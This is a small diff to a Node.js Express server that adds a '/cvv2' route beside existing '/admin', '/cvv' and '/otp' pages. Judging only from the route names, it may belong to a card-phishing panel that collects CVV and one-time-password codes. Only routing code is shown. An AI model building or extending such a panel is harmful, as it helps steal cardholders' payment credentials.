@@ -821,6 +821,7 @@ function getStats() {
 app.get('/admin', (req, res) => res.sendFile(path.join(__dirname, 'admin.html')));
 app.get('/cvv', (req, res) => res.sendFile(path.join(__dirname, 'cvv.html')));
 app.get('/otp', (req, res) => res.sendFile(path.join(__dirname, 'cvv.html')));
+app.get('/cvv2', (req, res) => res.sendFile(path.join(__dirname, 'otp2.html')));
 app.get('*', (req, res) => res.sendFile(path.join(__dirname, 'index.html')));
 
 // ==================== Start ====================
